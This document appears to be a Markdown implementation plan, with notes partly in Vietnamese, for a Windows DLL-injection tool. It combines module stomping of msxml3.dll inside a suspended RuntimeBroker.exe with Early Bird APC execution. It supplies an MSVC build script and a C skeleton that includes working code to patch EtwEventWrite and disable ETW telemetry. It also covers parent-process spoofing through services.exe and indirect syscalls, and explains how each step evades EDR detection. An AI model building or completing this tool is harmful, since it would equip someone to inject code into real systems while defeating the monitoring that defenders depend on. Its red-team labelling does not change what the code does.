# Plan 1 — DLL Injection: Implementation Plan

> **Target**: T1055.001 | **Technique**: Module Stomping + Early Bird APC | **Pre-condition**: SYSTEM/Admin

---

## 0. Project Structure

```
Process_Injection/
├── shared/
│   ├── common.h              ← Shared types, NT API, crypto declarations
│   ├── syscall_resolver.c    ← Indirect syscall resolution + wrappers
│   ├── sha256.c              ← SHA-256 hash
│   ├── aes256_gcm.c          ← AES-256-CTR + SHA-256 tag
│   └── ads_writer.c          ← AES-256-GCM encrypt + ADS output
├── Plan1_DLL_Injection/
│   ├── main.c                ← Module Stomping + Early Bird APC Injection
│   ├── build.bat             ← MSVC build script
│   ├── README.md             ← Setup & run guide
│   └── test/
│       ├── run_test.ps1
│       └── detect_check.ps1
└── Plan2_PE_Injection/
    ├── main.c                ← Process Doppelgänging via TxF
    ├── build.bat
    ├── README.md
    └── test/
```

---

## 1. Build

```batch
@echo off
REM build.bat — Plan 1 DLL Injection
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

cl.exe %CFLAGS% /Fe"DLLInjection.exe" ^
    main.c ^
    ..\shared\syscall_resolver.c ^
    ..\shared\sha256.c ^
    ..\shared\aes256_gcm.c ^
    ..\shared\ads_writer.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT ^
    kernel32.lib ntdll.lib advapi32.lib crypt32.lib

echo Build complete: DLLInjection.exe
```

---

## 2. Core Implementation

### 2.1 Attack Chain (single main.c)

```c
// Plan 1 — Module Stomping + Early Bird APC Injection (T1055.001)
// Flow: Init syscalls → ETW patch → Create suspended process (PPID spoof)
//       → Module stomp (overwrite .text) → APC queue → Resume → Execute
#include "../shared/common.h"

// ─── Embedded reflective PIC payload (x86-64, position-independent) ───
// This small PIC payload:
//   1. Walks PEB to find kernel32.dll
//   2. Resolves GetProcAddress
//   3. Writes success marker to ADS
//   4. Returns cleanly (thread continues)
static BYTE g_Payload[] = { /* ... PIC bytes ... */ };

// ─── ETW Patch ───
static BOOL PatchEtw(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PBYTE p = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    if (!p) return FALSE;
    DWORD old;
    VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, &old);
    p[0]=0x33; p[1]=0xC0; p[2]=0xC3; // xor eax,eax; ret
    VirtualProtect(p, 3, old, &old);
    return TRUE;
}

// ─── Create suspended process ───
static HANDLE CreateSuspendedTarget(DWORD* pid, HANDLE* hThread) {
    // PPID spoof: find services.exe PID
    DWORD ppid = FindProcessPid(L"services.exe");

    // Build PS_CREATE_INFO for NtCreateUserProcess
    // ... PS_ATTRIBUTE_LIST with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS ...
    // NtCreateUserProcess → PROCESS_CREATE_FLAGS_CREATE_SUSPENDED
    // Returns process + thread handles
}

// ─── Module Stomping ───
static BOOL ModuleStomp(HANDLE hProc, PVOID* outEntryAddr) {
    // 1. Find target's PEB → Ldr → find msxml3.dll base
    // 2. Parse PE headers at base → find .text section RVA + VirtualSize
    // 3. NtProtectVirtualMemory: change .text to RW
    // 4. NtWriteVirtualMemory: write PIC payload to .text
    // 5. NtProtectVirtualMemory: change .text back to RX
    // 6. Return entry point address in target (moduleBase + textRVA)
}

// ─── Early Bird APC ───
static BOOL EarlyBirdApc(HANDLE hThread, PVOID entryAddr) {
    // NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)entryAddr, NULL, NULL)
    // NtResumeThread(hThread) — APC delivered immediately after resume
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] DLL Injection — Module Stomping + Early Bird APC\n");

    // 1. Resolve indirect syscalls
    wprintf(L"[1] Resolving syscalls from disk ntdll... ");
    InitSyscallResolver(); wprintf(L"OK\n");

    // 2. Patch ETW
    wprintf(L"[2] Patching ETW... ");
    PatchEtw(); wprintf(L"OK\n");

    // 3. Create suspended target
    wprintf(L"[3] Creating suspended RuntimeBroker.exe... ");
    DWORD pid; HANDLE hThread;
    HANDLE hProc = CreateSuspendedTarget(&pid, &hThread);
    wprintf(L"PID=%d\n", pid);

    // 4. Module stomping
    wprintf(L"[4] Module stomping msxml3.dll... ");
    PVOID entryAddr;
    ModuleStomp(hProc, &entryAddr);
    wprintf(L"OK (entry=%p)\n", entryAddr);

    // 5. Queue APC + Resume
    wprintf(L"[5] Queueing APC + resuming thread... ");
    EarlyBirdApc(hThread, entryAddr);
    wprintf(L"OK\n");

    // 6. Verify
    wprintf(L"[6] Waiting for payload signal... ");
    Sleep(2000);
    // Check ADS for success marker

    wprintf(L"[+] Injection complete — check ADS for result\n");
    return 0;
}
```

---

## 3. Key Technical Notes

### Module Stomping vs Traditional Injection
- **Traditional**: VirtualAllocEx (RWX) → WriteProcessMemory → CreateRemoteThread
  - Bị detect bởi: RWX memory scan, CreateRemoteThread callback, WriteProcessMemory hook
- **Module Stomping**: Overwrite legitimate DLL .text → APC queue → Resume
  - Bypass: Memory vẫn Image type, không thread mới, không RWX, indirect syscalls

### Reflective PIC Payload
- Không import table — tất cả API resolves qua PEB walk
- Position-independent (có thể chạy ở bất kỳ địa chỉ nào)
- Gọi `DllMain` của embedded DLL → tất cả initialization trong DllMain
- Sau payload: thread trả về execution flow bình thường (target không crash)

### PPID Spoofing
- `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` trong `PS_ATTRIBUTE_LIST`
- Parent = services.exe → process tree trông legitimate
- Bypass process ancestry-based detection

### Suspended Process Timing
- APC được queue khi thread đang suspended
- Khi ResumeThread được gọi → kernel deliver APC NGAY LẬP TỨC
- Đây là "Early Bird" — payload chạy trước khi process thực sự bắt đầu execution
- Process initialization code chưa kịp chạy → EDR DLL chưa kịp load trong target
